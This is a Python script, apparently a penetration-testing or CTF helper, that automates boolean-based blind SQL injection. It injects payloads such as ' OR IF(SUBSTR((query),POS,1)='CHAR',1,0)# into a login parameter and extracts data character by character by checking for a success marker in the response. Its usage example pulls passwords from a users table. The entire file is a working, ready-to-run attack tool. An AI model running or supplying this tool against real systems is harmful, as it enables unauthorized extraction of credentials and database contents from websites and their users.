"""Boolean-based blind SQL injection — complement to time-based."""

from __future__ import annotations
import sys
import string

try:
    import requests as _requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

DEFAULT_CHARSET = string.ascii_lowercase + string.digits + "_{}-$!."


def bool_blind(
    url: str,
    method: str = "get",
    data_template: dict | None = None,
    success_marker: str = "success",
    charset: str = DEFAULT_CHARSET,
    max_len: int = 64,
    verbose: bool = True,
) -> str:
    """Boolean-based blind extraction.

    The payload template in data uses {POS} and {CHAR} placeholders.
    success_marker: string that appears in response when condition is true.

    Example data_template:
        {"username": "admin' AND SUBSTRING(password,{POS},1)='{CHAR}'-- ", "password": "x"}
    """
    result = []
    for pos in range(1, max_len + 1):
        found = False
        for ch in charset:
            payload = {}
            for k, v in (data_template or {}).items():
                payload[k] = v.replace("{POS}", str(pos)).replace("{CHAR}", ch)

            try:
                if method == "post":
                    if HAS_REQUESTS:
                        resp = _requests.post(url, data=payload, timeout=10)
                    else:
                        import urllib.request, urllib.parse
                        data = urllib.parse.urlencode(payload).encode()
                        req = urllib.request.Request(url, data=data)
                        resp = urllib.request.urlopen(req, timeout=10)
                        resp = type('R', (), {'text': resp.read().decode(), 'status_code': resp.getcode()})()
                else:
                    qs = "&".join(f"{k}={v}" for k, v in payload.items())
                    if HAS_REQUESTS:
                        resp = _requests.get(f"{url}?{qs}", timeout=10)
                    else:
                        import urllib.request
                        req = urllib.request.Request(f"{url}?{qs}")
                        raw = urllib.request.urlopen(req, timeout=10)
                        resp = type('R', (), {'text': raw.read().decode(), 'status_code': raw.getcode()})()

                if success_marker in resp.text:
                    result.append(ch)
                    if verbose:
                        print(f"  pos {pos}: {ch} (match)", flush=True)
                    found = True
                    break
            except Exception as e:
                if verbose:
                    sys.stdout.write(f"\r  pos {pos}: err '{ch}': {e}   ")
                    sys.stdout.flush()
                continue

            if verbose:
                sys.stdout.write(f"\r  pos {pos}: trying '{ch}'...   ")
                sys.stdout.flush()

        if not found:
            if verbose:
                print(f"\n  [done] extracted: {''.join(result)}")
            break
    return "".join(result)


def quick_bool(url: str, query: str, success_text: str = "success",
               method: str = "post", param: str = "username") -> str:
    """Quick boolean blind with minimal config.

    Args:
        url: Target URL
        query: SQL query to extract, e.g. "SELECT password FROM users"
        success_text: Text indicating true condition
        method: "get" or "post"
        param: Parameter name for injection
    """
    data = {param: f"' OR IF(SUBSTR(({query}),{{POS}},1)='{{CHAR}}',1,0)#",
            "password": "x"}

    print(f"Target: {url}")
    print(f"Query: {query}")
    print(f"Marker: '{success_text}'")
    print(f"Extracting...\n")

    return bool_blind(url, method=method, data_template=data,
                      success_marker=success_text)


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python bool_inject.py <URL> <QUERY> [--success <text>] [--method get|post]")
        print("Example: python bool_inject.py http://site/login.php 'SELECT password FROM users' --success 'login ok'")
        sys.exit(0)

    url = sys.argv[1]
    query = sys.argv[2]
    success_text = "success"
    method = "post"

    i = 3
    while i < len(sys.argv):
        if sys.argv[i] == "--success":
            success_text = sys.argv[i + 1]
            i += 2
        elif sys.argv[i] == "--method":
            method = sys.argv[i + 1]
            i += 2
        else:
            i += 1

    result = quick_bool(url, query, success_text=success_text, method=method)
    print(f"\nResult: {result}")
